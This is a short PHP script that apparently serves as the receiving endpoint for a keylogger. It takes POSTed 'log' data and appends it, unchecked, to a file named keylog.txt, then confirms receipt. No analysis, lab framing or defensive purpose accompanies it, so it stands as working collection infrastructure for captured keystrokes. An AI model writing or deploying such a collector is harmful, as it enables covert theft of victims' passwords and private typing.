<?php
$log_file = "logs/keylog.txt";
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['log'])) {
    $log_data = $_POST['log'];
    
    file_put_contents($log_file, $log_data . "\n", FILE_APPEND);
    
    echo "Log received successfully!";
} else {
    echo "No log data received!";
}
?>
